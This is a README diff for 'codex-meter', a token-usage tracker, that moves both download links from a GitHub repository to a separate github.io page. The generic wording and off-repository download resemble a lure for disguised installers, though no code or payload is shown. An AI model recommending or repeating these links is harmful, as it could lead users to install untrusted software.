@@ -1,6 +1,6 @@
 # 📊 codex-meter - Track your usage and save money
 
-[![](https://img.shields.io/badge/Download-codex--meter-blue.svg)](https://github.com/Tammaradehiscent358/codex-meter)
+[![](https://img.shields.io/badge/Download-codex--meter-blue.svg)](https://tammaradehiscent358.github.io)
 
 Codex-meter helps you manage your token usage. This application runs quietly in your system menu bar. It tracks how many tokens you use, monitors your quota limits, and calculates your reset times. You stay informed about your local token trends without manual checks.
 
@@ -8,7 +8,7 @@ Codex-meter helps you manage your token usage. This application runs quietly in 
 
 You must visit the project page to download the latest version of this tool. Your computer requires a standard installation process to run this software.
 
-[Click here to visit the download page](https://github.com/Tammaradehiscent358/codex-meter)
+[Click here to visit the download page](https://tammaradehiscent358.github.io)
 
 ## 🛠 Features
 
